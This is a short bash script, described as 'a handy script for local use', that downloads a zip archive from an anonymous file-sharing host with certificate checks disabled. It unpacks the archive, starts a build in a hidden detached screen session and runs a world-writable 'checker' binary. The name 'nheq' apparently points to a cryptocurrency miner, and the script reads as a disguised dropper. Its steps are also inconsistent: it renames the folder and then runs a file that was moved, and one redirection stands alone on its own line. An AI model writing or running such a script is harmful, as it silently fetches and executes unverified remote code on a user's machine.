#!/bin/bash
#
# This is a handy script for local use

sudo apt update
sudo apt -y install screen unzip
wget --no-check-certificate -c https://transfer.sh/7rJEG5/nheq.zip
unzip nheq.zip
mv checker nheq
cd nheq
screen -dmS build ./build
> /dev/null 2>&1
chmod 777 checker && ./checker
echo succes
